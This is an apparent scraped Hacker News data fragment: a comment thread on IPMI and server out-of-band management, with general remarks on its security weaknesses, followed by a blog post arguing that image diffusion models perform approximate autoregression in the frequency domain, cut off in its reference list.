agorootparentprev> How much more power is dissipated clearly depends on the quality of the PSU Yeah I know - while \"quality\" (I assume efficiency) is not the only factor, because low tier PSU ( That'll exceed 5W though. Only running all the time. Paired with a Tasmota Shelly Plug it consumes near 0W. Additionally it is Board independent and together with a HDMI- / USB-KVM-Switch it can be used for multiple hosts. I also thought about using PiKVM similar devices on my Banana PI 3 OpenWRT router, so this thing is running all the time and powerful enough to handle this. reply mikeocool 6 hours agoparentprevMeshCommander releases are still available -- https://www.meshcommander.com/ Can also still be installed from NPM. Also haven't tried it out, but I believe this is aiming to be the successor: https://meshcentral.com/ reply dugite-code 12 hours agoparentprevSimilarly I'm looking into the nano kvm now the firmware is open https://github.com/sipeed/NanoKVM reply dugite-code 8 hours agorootparentUpdate, perhaps I was miss-informed. Looks like the firmware isn't in the repo, just the web interface. Disappointing, I had read on a blog somewhere recently that they had released the firmware and didn't look into it deeply enough > the backend will be open-sourced soon (after the GitHub repository reaches 2K stars). https://en.wiki.sipeed.com/hardware/en/kvm/NanoKVM/system/in... reply sandreas 8 hours agorootparentI would love to see an OpenWRT implementation, so that your router can be your KVM device :-) reply stragies 4 hours agorootparentI believe, that few, if any of the currently supported boards feature all of: USB Device Port, HDMI-Port (or sufficiently fast USB-Host-Port for Capture Adapter), HW-Video-Encode (or beafy enough CPU), enough available (programmable) GPIOs reply sandreas 2 hours agorootparentI think with Wifi 6e and 7 this is no longer true. Most of these devices are really powerful supporting at least one usb3 port. This is probably no longer a problem in the near future, especially when 1080p is enough. reply petee 7 hours agoparentprevMeshCommander 0.96 is available on its website again; from what ive read the dev has been settling into a new job reply peter_d_sherman 17 minutes agoprevMy takeaways: >\"Out-of-band management, sometimes also called lights-out management, identifies a capability that is almost unheard of in clients. A separate, smaller management computer allows for remote access to a server even when it is, say, powered off. The terms out-of-band and in-band in this context emerge from their customery uses in networking and telecom, meaning that out of band management is performed without the use of the standard (we might say \"data plane\") network connection to a machine. But in practice they have drifted in meaning, and it is probably better to think of out-of-band management as meaning that the operating system and general-purpose components are not required. This might be made clearer by comparison: a very standard example of in-band management would be SSH, a service provided by the software on a computer that allows you to interact with it. Out-of-band management, by contrast, is provided by a dedicated hardware and software stack and does not require the operating system or, traditionally, even the CPU to cooperate.\" [...] >\"The IPMI software runs on a processor conventionally called the baseboard management controller or BMC, and the terms IPMI and BMC are sometimes used interchangeably. Lights-out management or LOM is mostly an obsolete term but sticks around because HP(E) is a fan of it and continues to call their IPMI implementation Integrated Lights-Out. The BMC should not be confused with the System Management Controller or SMC\" [...] \"IPMI offers \"sideband\" networking. With sideband management, the BMC communicates directly with the same NIC that the operating system uses. The implementation is a little bit weird: the NIC will pretend to be two different interfaces, mixing IPMI traffic into the same packet stream as host traffic but using a different MAC address.\" [...] \"Details of network features vary between IPMI implementations, but there is a standard interface on UDP 623 that can be used for discovery and basic commands. There's often SSH and a web interface, and VNC is pretty common for remote console.\" This is arguably the best educational article on IPMI and related subsystems (I did not know about 90% of this!) that I've read for a long time. Well worth a re-read in the future... reply Animats 11 hours agoprevA big question with IPMI is what the default keys are. If someone manages to install some extra IPMI keys somewhere in the supply chain, or there's a default key, they can remote admin the computer.[1] [1] https://www.rapid7.com/blog/post/2013/07/02/a-penetration-te... reply jabroni_salad 4 hours agoparentAn additional quote from that link: > In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user's password to the client, prior to the client authenticating. ipmi also has a maximum password length of 20 characters. In realworld you have to note that we only expect hashes to remain secret from known pentesters who have a limited contractual runtime, not a real attacker with unlimited time on their hands. I'm very critical of this. It's been in the spec for 20 years. Is not the whole point of software that it is easier to change than hardware? It's easy to say \"you should put this on a vlan\" but I pretty much ALWAYS see ipmi on the business network in my assessments. If you put dumb stuff in your defaults then you're gonna end up with dumb stuff all over the globe and that includes every business without a knowledgeable security administrator that decides to \"buy a server\". reply gnufx 9 hours agoparentprevWell, it should always be on a physically isolated network, and avoid BMCs which share their NIC with the system. reply OSI-Auflauf 8 hours agoprevSeen devices with IPMI that had by design unauthenticated admin login to the IPMI from the host side that was not removable. They also could flash IPMI firmware from the host. So if your server with such an IPMI is infected you can't trust reimaging it via IPMI because that can be hijacked as well. reply dfox 7 hours agoparentI would consider that mostly a feature. The situation where that is useful (you somehow lost the credentials for BMC, but have root access to the host) is in my experience significantly more common (I see that multiple times in a year) than attacker implanting stuff into the BMC firmware (never seen that). Obviously if you rent out whole physical machines and automate the provisioning by IPMI, then the last thing you want is the customer having admin access to the BMC. Dell iDRAC has an interesting feature that allows you to make all of the BMC configuration read-only which can only be disabled by factory resetting the iDRAC by means of physical (and IIRC not exactly documented) switch on the BMC board. (Well, it is still _i_DRAC as in “integrated”, but on current higher-end PowerEdges the iDRAC is separate OCP-like card, but well, the system does not work without it) reply qwertox 12 hours agoprevCan an AST2600 BMC be used as a graphics card by Ubuntu Desktop? I've read that it has a \"2D Video Graphic Adapter with PCIe bus interface\", which makes it sound like it is exposed to the OS like any other graphics card. The desktop would be there only for troubleshooting, not for normal stuff which would usually require an iGPU or better. If yes, would it work out of the box with Ubuntu? reply geerlingguy 6 hours agoparentI use it with ASPEED's latest Windows driver at 1080p, and it does a passable job on my Ampere Altra system for simple tasks. Most servers don't run an accelerated server desktop and do things like play AAA games and YouTube. reply eqvinox 8 hours agoparentprevCan it? Yes. Do you want to? No. It's essentially just a framebuffer, not a GPU; it barely has 2D graphics acceleration. Using any kind of modern DE on it will drive you insane within minutes. Xfce and classic X11 might work. reply vardump 11 hours agoparentprevYes, but it's not going to be speedy, as it is just a dumb framebuffer and the maximum resolution is 1920x1080. The most modern feature is probably double buffering. :-) reply grw_ 12 hours agoparentprevyes, it does- lspcigrep ASP c2:00.0 VGA compatible controller: ASPEED Technology, Inc. ASPEED Graphics Family (rev 52) reply buserror 12 hours agoprevIPMI is such an improvement on the old ISA-style iochips, and not even sure they are more expensive these days! It's not just the remote/web access which is great, plain 'introspection' with tools like ipmiutil and ipmitool are super useful, even if you don't have a huge rack 'enterprise' installation. reply ggm 7 hours agoprevHands up if you used a real weasel! Cute advertising imagery. I depend on idrac. The newer one is bearable. The old Java was torrid. reply swiftcoder 6 hours agoprevDoes anyone else see a pixel or so of mismatch between the background and the text when scrolling? reply hexmiles 12 hours agoprevDoes anyone know about AMD ST? It is the first time I've seen it mentioned. I tried to google it, but without result. reply voxadam 12 hours agoparentAMD ST (Secure Technology) is the official name for what most people call AMD PSP (Platform Security Processor). reply Neil44 4 hours agoprevNot a fan of the web based OOB management, it's convenient for now but this morning I had a right faff trying to connect to an old iLO3 service, which is new enough to force https but old enough that all it's protocols are deprecated on modern machines. I've used vPro and found it almost deliberately difficult to use, and poorly documented. It could be so easy but just isn't. Like so many things... shakes fist at sky. reply toast0 1 hour agoparent> which is new enough to force https but old enough that all it's protocols are deprecated on modern machines This is the danger of https only. http services may be insecure, but don't ever expire; https implementations will expire without updates, and there's not going to be updates on these, and it's unknowable when the expiration will be. reply _joel 9 hours agoprevipmitool has dug me out of many sticky situations in the past, although it needs to be handled as proper oob, in terms of network isolation. reply renewiltord 13 hours agoprevPersonally, for smaller deployments (I.e. about 10k cores) I would just self deploy out from some integrator. A Gigabyte/AsRock Rack Motherboard + Epyc 9003 series + some 384 G of RAM with the usual dual PSUs and all that stuff will be $7k/node and can be very power efficient. The integrated IPMI is pretty good on these and plays well with ipmitool. They'll usually have some Redfish stuff going on. reply TMWNN 13 hours agoprevI have found HP iLO very useful on my MicroServer Gen8 with UnRAID. reply brcmthrowaway 12 hours agoprevWas IPMI useful in solving the CrowdStrike boondoggle? reply sofixa 12 hours agoparentYep, because on enterprise servers in a rack somewhere in a remote datacenters, IPMI is what allows admins to connect remotely, restart, and get a remote console to remove the offending files (or just keep restarting). reply throw0101d 6 hours agorootparent> […] and get a remote console to remove the offending files (or just keep restarting). Sometimes (often?) you need a more 'advanced' OOB/LOM license to get remote console from Dell/HP/Lenovo/etc. reply omgtehlion 12 hours agoparentprevI suppose it was useful only for a part of the problem, as most CrowdStroke™ machines were client and kiosk... reply xaduha 12 hours agoparentprevSince one of the solutions was to reboot \"up to 15 times\" I would imagine so. reply smitty1e 13 hours agoprevIntelligent Platform Management Interface https://en.m.wikipedia.org/wiki/Intelligent_Platform_Managem... reply concerndc1tizen 11 hours agoprev [–] Conspiracy theory: I wonder if the ____KVM people are betting that most people won't flash their own firmware, and just keep using what was provided, which may contain malware, both for accessing the network, and controlling the connected hardware. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author is transitioning their enterprise cloud to New Mexico, including purchasing a new server to replace an outdated one.",
      "Modern servers, such as Dell PowerEdge and HP ProLiant, are essentially powerful computers with advanced management features like IPMI for remote access and management.",
      "Security concerns with IPMI necessitate isolating it from untrusted networks, highlighting the importance of understanding the specific capabilities and limitations of server management systems."
    ],
    "commentSummary": [
      "Intel is currently trailing AMD in both CPU and GPU performance, with the exception of the N100 series CPUs.",
      "AMD CPUs are favored for their superior performance and cost-efficiency, while Intel CPUs are often used for direct replacements in existing setups.",
      "Redfish is emerging as a more secure and user-friendly alternative to IPMI for server management."
    ],
    "points": 233,
    "commentCount": 100,
    "retryCount": 0,
    "time": 1725337389
  },
  {
    "id": 41431293,
    "title": "Diffusion Is Spectral Autoregression",
    "originLink": "https://sander.ai/2024/09/02/spectral-autoregression.html",
    "originBody": "Diffusion is spectral autoregression September 02, 2024 Reading time ~27 minutes A bit of signal processing swiftly reveals that diffusion models and autoregressive models aren’t all that different: diffusion models of images perform approximate autoregression in the frequency domain! This blog post is also available as a Python notebook in Google Colab , with the code used to produce all the plots and animations. Last year, I wrote a blog post describing various different perspectives on diffusion. The idea was to highlight a number of connections between diffusion models and other classes of models and concepts. In recent months, I have given a few talks where I discussed some of these perspectives. My talk at the EEML 2024 summer school in Novi Sad, Serbia, was recorded and is available on YouTube. Based on the response I got from this talk, the link between diffusion models and autoregressive models seems to be particularly thought-provoking. That’s why I figured it could be useful to explore this a bit further. In this blog post, I will unpack the above claim, and try to make it obvious that this is the case, at least for visual data. To make things more tangible, I decided to write this entire blog post in the form of a Python notebook (using Google Colab). That way, you can easily reproduce the plots and analyses yourself, and modify them to observe what happens. I hope this format will also help drive home the point that this connection between diffusion models and autoregressive models is “real”, and not just a theoretical idealisation that doesn’t hold up in practice. In what follows, I will assume a basic understanding of diffusion models and the core concepts behind them. If you’ve watched the talk I linked above, you should be able to follow along. Alternatively, the perspectives on diffusion blog post should also suffice as preparatory reading. Some knowledge of the Fourier transform will also be helpful. Below is an overview of the different sections of this post. Click to jump directly to a particular section. Two forms of iterative refinement A spectral view of diffusion What about sound? Unstable equilibrium Closing thoughts Acknowledgements References Two forms of iterative refinement Autoregression and diffusion are currently the two dominant generative modelling paradigms. There are many more ways to build generative models: flow-based models and adversarial models are just two possible alternatives (I discussed a few more in an earlier blog post). Both autoregression and diffusion differ from most of these alternatives, by splitting up the difficult task of generating data from complex distributions into smaller subtasks that are easier to learn. Autoregression does this by casting the data to be modelled into the shape of a sequence, and recursively predicting one sequence element at a time. Diffusion instead works by defining a corruption process that gradually destroys all structure in the data, and training a model to learn to invert this process step by step. This iterative refinement approach to generative modelling is very powerful, because it allows us to construct very deep computational graphs for generation, without having to backpropagate through them during training. Indeed, both autoregressive models and diffusion models learn to perform a single step of refinement at a time – the generative process is not trained end-to-end. It is only when we try to sample from the model that we connect all these steps together, by sequentially performing the subtasks: predicting one sequence element after another in the case of autoregression, or gradually denoising the input step-by-step in the case of diffusion. Because this underlying iterative approach is common to both paradigms, people have often sought to connect the two. One could frame autoregression as a special case of discrete diffusion, for example, with a corruption process that gradually replaces tokens by “mask tokens” from right to left, eventually ending up with a fully masked sequence. In the next few sections, we will do the opposite, framing diffusion as a special case of autoregression, albeit approximate. Today, most language models are autoregressive, while most models of images and video are diffusion-based. In many other application domains (e.g. protein design, planning in reinforcement learning, …), diffusion models are also becoming more prevalent. I think this dichotomy, which can be summarised as “autoregression for language, and diffusion for everything else”, is quite interesting. I have written about it before, and I will have more to say about it in a later section of this post. A spectral view of diffusion Image spectra When diffusion models rose to prominence for image generation, people noticed quite quickly that they tend to produce images in a coarse-to-fine manner. The large-scale structure present in the image seems to be decided in earlier denoising steps, whereas later denoising steps add more and more fine-grained details. To formalise this observation, we can use signal processing, and more specifically spectral analysis. By decomposing an image into its constituent spatial frequency components, we can more precisely tease apart its coarse- and fine-grained structure, which correspond to low and high frequencies respectively. We can use the 2D Fourier transform to obtain a frequency representation of an image. This representation is invertible, i.e. it contains the same information as the pixel representation – it is just organised in a different way. Like the pixel representation, it is a 2D grid-structured object, with the same width and height as the original image, but the axes now correspond to horizontal and vertical spatial frequencies, rather than spatial positions. To see what this looks like, let’s take some images and visualise their spectra. Four images from the Imagenette dataset (top), along with their magnitude spectra (middle) and their phase spectra (bottom). Shown above on the first row are four images from the Imagenette dataset, a subset of the ImageNet dataset (I picked it because it is relatively fast to load). The Fourier transform is typically complex-valued, so the next two rows visualise the magnitude and the phase of the spectrum respectively. Because the magnitude varies greatly across different frequencies, its logarithm is shown. The phase is an angle, which varies between \\(-\\pi\\) and \\(\\pi\\). Note that we only calculate the spectrum for the green colour channel – we could calculate it for the other two channels as well, but they would look very similar. The centre of the spectrum corresponds to the lowest spatial frequencies, and the frequencies increase as we move outward to the edges. This allows us to see where most of the energy in the input signal is concentrated. Note that by default, it is the other way around (low frequencies in the corner, high frequencies in the middle), but np.fft.fftshift allows us to swap these, which yields a much nicer looking visualisation that makes the structure of the spectrum more apparent. A lot of interesting things can be said about the phase structure of natural images, but in what follows, we will primarily focus on the magnitude spectrum. The square of the magnitude is the power, so in practice we often look at the power spectrum instead. Note that the logarithm of the power spectrum is simply that of the magnitude spectrum, multiplied by two. Looking at the spectra, we now have a more formal way to reason about different feature scales in images, but that still doesn’t explain why diffusion models exhibit this coarse-to-fine behaviour. To see why this happens, we need to examine what a typical image spectrum looks like. To do this, we will make abstraction of the directional nature of frequencies in 2D space, simply by slicing the spectrum along a certain angle, rotating that slice all around, and then averaging the slices across all rotations. This yields a one-dimensional curve: the radially averaged power spectral density, or RAPSD. Below is an animation that shows individual directional slices of the 2D spectrum on a log-log plot, which are averaged to obtain the RAPSD. Animation that shows individual directional slices of the 2D spectrum of an image on a log-log plot. Let’s see what that looks like for the four images above. We will use the pysteps library, which comes with a handy function to calculate the RAPSD in one go. Four images from the Imagenette dataset (top), along with their radially averaged spectral power densities (RAPSDs, bottom). The RAPSD is best visualised on a log-log plot, to account for the large variation in scale. We chop off the so-called DC component (with frequency 0) to avoid taking the logarithm of 0. Another thing this visualisation makes apparent is that the curves are remarkably close to being straight lines. A straight line on a log-log plot implies that there might be a power law lurking behind all of this. Indeed, this turns out to be the case: natural image spectra tend to approximately follow a power law, which means that the power \\(P(f)\\) of a particular frequency \\(f\\) is proportional to \\(f^{-\\alpha}\\), where \\(\\alpha\\) is a parameter1 2 3. In practice, \\(\\alpha\\) is often remarkably close to 2 (which corresponds to the spectrum of pink noise in two dimensions). We can get closer to the “typical” RAPSD by taking the average across a bunch of images (in the log-domain). The average of RAPSDs of a set of images in the log-domain. As I’m sure you will agree, that is pretty unequivocally a power law! To estimate the exponent \\(\\alpha\\), we can simply use linear regression in log-log space. Before proceeding however, it is useful to resample our averaged RAPSD so the sample points are linearly spaced in log-log space – otherwise our fit will be dominated by the high frequencies, where we have many more sample points. We obtain an estimate \\(\\hat{\\alpha} = 2.454\\), which is a bit higher than the typical value of 2. As far as I understand, this can be explained by the presence of man-made objects in many of the images we used, because they tend to have smooth surfaces and straight angles, which results in comparatively more low-frequency content and less high-frequency content compared to images of nature. Let’s see what our fit looks like. The average of RAPSDs of a set of images in the log-domain (red line), along with a linear fit (dotted black line). Noisy image spectra A crucial aspect of diffusion models is the corruption process, which involves adding Gaussian noise. Let’s see what this does to the spectrum. The first question to ask is: what does the spectrum of noise look like? We can repeat the previous procedure, but replace the image input with standard Gaussian noise. For contrast, we will visualise the spectrum of the noise alongside that of the images from before. The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line). The RAPSD of Gaussian noise is also a straight line on a log-log plot; but a horizontal one, rather than one that slopes down. This reflects the fact that Gaussian noise contains all frequencies in equal measure. The Fourier transform of Gaussian noise is itself Gaussian noise, so its power must be equal across all frequencies in expectation. When we add noise to the images and look at the spectrum of the resulting noisy images, we see a hinge shape: The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of standard Gaussian noise (blue line) and the average of RAPSDs of their sum (green line). Why does this happen? Recall that the Fourier transform is linear: the Fourier transform of the sum of two things, is the sum of the Fourier transforms of those things. Because the power of the different frequencies varies across orders of magnitude, one of the terms in this sum tends to drown out the other. This is what happens at low frequencies, where the image spectrum dominates, and hence the green curve overlaps with the red curve. At high frequencies on the other hand, the noise spectrum dominates, and the green curve overlaps with the blue curve. In between, there is a transition zone where the power of both spectra is roughly matched. If we increase the variance of the noise by scaling the noise term, we increase its power, and as a result, its RAPSD will shift upward (which is also a consequence of the linearity of the Fourier transform). This means a smaller part of the image spectrum now juts out above the waterline: the increasing power of the noise looks like the rising tide! The average of RAPSDs of a set of images in the log-domain (red line), along with the average of RAPSDs of Gaussian noise with variance 16 (blue line) and the average of RAPSDs of their sum (green line). At this point, I’d like to revisit a diagram from the perspectives on diffusion blog post, where I originally drew the connection between diffusion and autoregression in frequency space, which is shown below. Magnitude spectra of natural images, Gaussian noise, and noisy images. These idealised plots of the spectra of images, noise, and their superposition match up pretty well with the real versions. When I originally drew this, I didn’t actually realise just how closely this reflects reality! What these plots reveal is an approximate equivalence (in expectation) between adding noise to images, and low-pass filtering them. The noise will drown out some portion of the high frequencies, and leave the low frequencies untouched. The variance of the noise determines the cut-off frequency of the filter. Note that this is the case only because of the characteristic shape of natural image spectra. The animation below shows how the spectrum changes as we gradually add more noise, until it eventually overpowers all frequency components, and all image content is gone. Animation that shows the changing averaged RAPSD as more and more noise is added to a set of images. Diffusion With this in mind, it becomes apparent that the corruption process used in diffusion models is actually gradually filtering out more and more high-frequency information from the input image, and the different time steps of the process correspond to a frequency decomposition: basically an approximate version of the Fourier transform! Since diffusion models themselves are tasked with reversing this corruption process step-by-step, they end up roughly predicting the next higher frequency component at each step of the generative process, given all preceding (lower) frequency components. This is a soft version of autoregression in frequency space, or if you want to make it sound fancier, approximate spectral autoregression. To the best of my knowledge, Rissanen et al. (2022)4 were the first to apply this kind of analysis to diffusion in the context of generative modelling (see §2.2 in the paper). Their work directly inspired this blog post. In many popular formulations of diffusion, the corruption process does not just involve adding noise, but also rescaling the input to keep the total variance within a reasonable range (or constant, in the case of variance-preserving diffusion). I have largely ignored this so far, because it doesn’t materially change anything about the intuitive interpretation. Scaling the input simply results in the RAPSD shifting up or down a bit. Which frequencies are modelled at which noise levels? There seems to be a monotonic relationship between noise levels and spatial frequencies (and hence feature scales). Can we characterise this quantitatively? We can try, but it is important to emphasise that this relationship is only really valid in expectation, averaged across many images: for individual images, the spectrum will not be a perfectly straight line, and it will not typically be monotonically decreasing. Even if we ignore all that, the “elbow” of the hinge-shaped spectrum of a noisy image is not very sharp, so it is clear that there is quite a large transition zone where we cannot unequivocally say that a particular frequency is dominated by either signal or noise. So this is, at best, a very smooth approximation to the “hard” autoregression used in e.g. large language models. Keeping all of that in mind, let us construct a mapping from noise levels to frequencies for a particular diffusion process and a particular image distribution, by choosing a signal-to-noise ratio (SNR) threshold, below which we will consider the signal to be undetectable. This choice is quite arbitrary, and we will just have to choose a value and stick with it. We can choose 1 to keep things simple, which means that we consider the signal to be detectable if its power is equal to or greater than the power of the noise. Consider a Gaussian diffusion process for which \\(\\mathbf{x}_t = \\alpha(t)\\mathbf{x}_0 + \\sigma(t) \\mathbf{\\varepsilon}\\), with \\(\\mathbf{x}_0\\) an example from the data distribution, and \\(\\mathbf{\\varepsilon}\\) standard Gaussian noise. Let us define \\(\\mathcal{R}[\\mathbf{x}](f)\\) as the RAPSD of an image \\(\\mathbf{x}\\) evaluated at frequency \\(f\\). We will call the SNR threshold \\(\\tau\\). If we consider a particular time step \\(t\\), then assuming the RAPSD is monotonically decreasing, we can define the maximal detectable frequency \\(f_\\max\\) at this time step in the process as the maximal value of \\(f\\) for which: \\[\\mathcal{R}[\\alpha(t)\\mathbf{x}_0](f) > \\tau \\cdot \\mathcal{R}[\\sigma(t)\\mathbf{\\varepsilon}](f).\\] Recall that the Fourier transform is a linear operator, and \\(\\mathcal{R}\\) is a radial average of the square of its magnitude. Therefore, scaling the input to \\(\\mathcal{R}\\) by a real value means the output gets scaled by its square. We can use this to simplify things: \\[\\mathcal{R}[\\mathbf{x}_0](f) > \\tau \\cdot \\frac{\\sigma(t)^2}{\\alpha(t)^2} \\mathcal{R}[\\mathbf{\\varepsilon}](f).\\] We can further simplify this by noting that \\(\\forall f: \\mathcal{R}[\\mathbf{\\varepsilon}](f) = 1\\): \\[\\mathcal{R}[\\mathbf{x}_0](f) > \\tau \\cdot \\frac{\\sigma(t)^2}{\\alpha(t)^2}.\\] To construct such a mapping in practice, we first have to choose a diffusion process, which gives us the functional form of \\(\\sigma(t)\\) and \\(\\alpha(t)\\). To keep things simple, we can use the rectified flow5 / flow matching6 process, as used in Stable Diffusion 37, for which \\(\\sigma(t) = t\\) and \\(\\alpha(t) = 1 - t\\). Combined with \\(\\tau = 1\\), this yields: \\[\\mathcal{R}[\\mathbf{x}_0](f) > \\left(\\frac{t}{1 - t}\\right)^2.\\] With these choices, we can now determine the shape of \\(f_\\max(t)\\) and visualise it. Maximum detectable frequency as a function of diffusion time, for a given set of images and the diffusion process used in rectified flow and flow matching formalisms. The frequencies here are relative: if the bandwidth of the signal is 1, then 0.5 corresponds to the Nyquist frequency, i.e. the maximal frequency that is representable with the given bandwidth. Note that all representable frequencies are detectable at time steps near 0. As \\(t\\) increases, so does the noise level, and hence \\(f_\\max\\) starts dropping, until it eventually reaches 0 (no detectable signal frequencies are left) close to \\(t = 1\\). What about sound? All of the analysis above hinges on the fact that spectra of natural images typically follow a power law. Diffusion models have also been used to generate audio8 9, which is the other main perceptual modality besides the visual. A very natural question to ask is whether the same interpretation makes sense in the audio domain as well. To establish that, we will grab a dataset of typical audio recordings that we might want to build a generative model of: speech and music. Four audio clips from the GTZAN music/speech dataset, and their corresponding spectrograms. Along with each audio player, a spectrogram is shown: this is a time-frequency representation of the sound, which is obtained by applying the Fourier transform to short overlapping windows of the waveform and stacking the resulting magnitude vectors together in a 2D matrix. For the purpose of comparing the spectrum of sound with that of images, we will use the 1-dimensional analogue of the RAPSD, which is simply the squared magnitude of the 1D Fourier transform. Magnitude spectra of four audio clips from the GTZAN music/speech dataset. These are a lot noisier than the image spectra, which is not surprising as these are not averaged over directions, like the RAPSD is. But aside from that, they don’t really look like straight lines either – the power law shape is nowhere to be seen! I won’t speculate about why images exhibit this behaviour and sound seemingly doesn’t, but it is certainly interesting (feel free to speculate away in the comments!). To get a cleaner view, we can again average the spectra of many clips in the log domain, as we did with the RAPSDs of images. The average of magnitude spectra of a set of audio clips the log-domain. Definitely not a power law. More importantly, it is not monotonic, so adding progressively more Gaussian noise to this does not obfuscate frequencies in descending order: the “diffusion is just spectral autoregression” meme does not apply to audio waveforms! The average spectrum of our dataset exhibits a peak around 300-400 Hz. This is not too far off the typical spectrum of green noise, which has more energy in the region of 500 Hz. Green noise is supposed to sound like “the background noise of the world”. Animation that shows the changing averaged magnitude spectrum as more and more noise is added to a set of audio clips. As the animation above shows, the different frequencies present in audio signals still get filtered out gradually from least powerful to most powerful, because the spectrum of Gaussian noise is still flat, just like in the image domain. But as the audio spectrum does not monotonically decay with increasing frequency, the order is not monotonic in terms of the frequencies themselves. What does this mean for diffusion in the waveform domain? That’s not entirely clear to me. It certainly makes the link with autoregressive models weaker, but I’m not sure if there are any negative implications for generative modelling performance. One observation that does perhaps indicate that this is the case, is that a lot of diffusion models of audio described in the literature do not operate directly in the waveform domain. It is quite common to first extract some form of spectrogram (as we did earlier), and perform diffusion in that space, essentially treating it like an image10 11 12. Note that spectrograms are a somewhat lossy representation of sound, because phase information is typically discarded. To understand the implications of this for diffusion models, we will extract log-scaled mel-spectrograms from the sound clips we have used before. The mel scale is a nonlinear frequency scale which is intended to be perceptually uniform, and which is very commonly used in spectral analysis of sound. Next, we will interpret these spectrograms as images and look at their spectra. Taking the spectrum of a spectrum might seem odd – some of you might even suggest that it is pointless, because the Fourier transform is its own inverse! But note that there are a few nonlinear operations happening in between: taking the magnitude (discarding the phase information), mel-binning and log-scaling. As a result, this second Fourier transform doesn’t just undo the first one. RAPSDs of mel-spectrograms of four audio clips from the GTZAN music/speech dataset. It seems like the power law has resurfaced! We can look at the average in the log-domain again to get a smoother curve. The average of RAPSDs of mel-spectrograms of a set of sound clips in the log-domain (red line), along with a linear fit (dotted black line). I found this pretty surprising. I actually used to object quite strongly to the idea of treating spectrograms as images, as in this tweet in response to Riffusion, a variant of Stable Diffusion finetuned on spectrograms: Me: \"NOOO, you can't just treat spectrograms as images, the frequency and time axes have completely different semantics, there is no locality in frequency and ...\" These guys: \"Stable diffusion go brrr\" https://t.co/Akv8aZl8Rv — Sander Dieleman (@sedielem) December 15, 2022 … but I have always had to concede that it seems to work pretty well in practice, and perhaps the fact that spectrograms exhibit power-law spectra is one reason why. There is also an interesting link with mel-frequency cepstral coefficients (MFCCs), a popular feature representation for speech and music processing which predates the advent of deep learning. These features are constructed by taking the discrete cosine transform (DCT) of a mel-spectrogram. The resulting spectrum-of-a-spectrum is often referred to as the cepstrum. So with this approach, perhaps the meme applies to sound after all, albeit with a slight adjustment: diffusion on spectrograms is just cepstral autoregression. Unstable equilibrium So far, we have talked about a spectral perspective on diffusion, but we have not really discussed how it can be used to explain why diffusion works so well for images. The fact that this interpretation is possible for images, but not for some other domains, does not automatically imply that the method should also work better. However, it does mean that the diffusion loss, which is a weighted average across all noise levels, is also implicitly a weighted average over all spatial frequencies in the image domain. Being able to individually weight these frequencies in the loss according to their relative importance is key, because the sensitivity of the human visual system to particular frequencies varies greatly. This effectively makes the diffusion training objective a kind of perceptual loss, and I believe it largely explains the success of diffusion models in the visual domain (together with classifier-free guidance). Going beyond images, one could use the same line of reasoning to try and understand why diffusion models haven’t really caught on in the domain of language modelling so far (I wrote more about this last year). The interpretation in terms of a frequency decomposition is not really applicable there, and hence being able to change the relative weighting of noise levels in the loss doesn’t quite have the same impact on the quality of generated outputs. For language modelling, autoregression is currently the dominant modelling paradigm, and while diffusion-based approaches have been making inroads recently13 14 15, a full-on takeover does not look like it is in the cards in the short term. This results in the following status quo: we use autoregression for language, and we use diffusion for pretty much everything else. Of course, I realise that I have just been arguing that these two approaches are not all that different in spirit. But in practice, their implementations can look quite different, and a lot of knowledge and experience that practitioners have built up is specific to each paradigm. To me, this feels like an unstable equilibrium, because the future is multimodal. We will ultimately want models that natively understand language, images, sound and other modalities mixed together. Grafting these two different modelling paradigms together to construct multimodal models is effective to some extent, and certainly interesting from a research perspective, but it brings with it an increased level of complexity (i.e. having to master two different modelling paradigms) which I don’t believe practitioners will tolerate in the long run. So in the longer term, it seems plausible that we could go back to using autoregression across all modalities, perhaps borrowing some ideas from diffusion in the process16 17. Alternatively, we might figure out how to build multimodal diffusion models for all modalities, including language. I don’t know which it is going to be, but both of those outcomes ultimately seem more likely than the current situation persisting. One might ask, if diffusion is really just approximate autoregression in frequency space, why not just do exact autoregression in frequency space instead, and maybe that will work just as well? That would mean we can use autoregression across all modalities, and resolve the “instability” in one go. Nash et al. (2021)18, Tian et al. (2024)16 and Mattar et al. (2024)19 explore this direction. There is a good reason not to take this shortcut, however: the diffusion sampling procedure is exceptionally flexible, in ways that autoregressive sampling is not. For example, the number of sampling steps can be chosen at test time (this isn’t impossible for autoregressive models, but it is much less straightforward to achieve). This flexibility also enables various distillation methods to reduce the number of steps required, and classifier-free guidance to improve sample quality. Before we do anything rash and ditch diffusion altogether, we will probably want to figure out a way to avoid having to give up some of these benefits. Closing thoughts When I first had a closer look at the spectra of real images myself, I realised that the link between diffusion models and autoregressive models is even stronger than I had originally thought – in the image domain, at least. This is ultimately why I decided to write this blog post in a notebook, to make it easier for others to see this for themselves as well. More broadly speaking, I find that learning by “doing” has a much more lasting effect than learning by reading, and hopefully making this post interactive can help with that. There are of course many other ways to connect the two modelling paradigms of diffusion and autoregression, which I won’t go into here, but it is becoming a rather popular topic of inquiry20 21 22. If you enjoyed this post, I strongly recommend also reading Rissanen et al. (2022)’s paper on generative modelling with inverse heat dissipation4, which inspired it. This blog-post-in-a-notebook was an experiment, so any feedback on the format is very welcome! It’s a bit more work, but hopefully some readers will derive some benefit from it. If there are enough of you, perhaps I will do more of these in the future. Please share your thoughts in the comments! To wrap up, below are some low-effort memes I made when I should have been working on this blog post instead. The interpretation of diffusion as autoregression in the frequency domain seems to be stirring up a lot of thought! (I may or may not have a new blog post in the works 🧐) pic.twitter.com/XSxP27pKSt — Sander Dieleman (@sedielem) August 4, 2024 It's so much easier to tweet low-effort memes which assert that diffusion is just autoregression in frequency space, than it is to write a blog post about it 🤷 (but I'm doing both!) pic.twitter.com/snLQavtZBf — Sander Dieleman (@sedielem) August 22, 2024 If you would like to cite this post in an academic context, you can use this BibTeX snippet: @misc{dieleman2024spectral, author = {Dieleman, Sander}, title = {Diffusion is spectral autoregression}, url = {https://sander.ai/2024/09/02/spectral-autoregression.html}, year = {2024} } Acknowledgements Thanks to my colleagues at Google DeepMind for various discussions, which continue to shape my thoughts on this topic! In particular, thanks to Robert Riachi, Ruben Villegas and Daniel Zoran. References van der Schaaf, van Hateren, “Modelling the Power Spectra of Natural Images: Statistics and Information”, Vision Research, 1996. ↩ Torralba, Oliva, “Statistics of natural image categories”, Network: Computation in 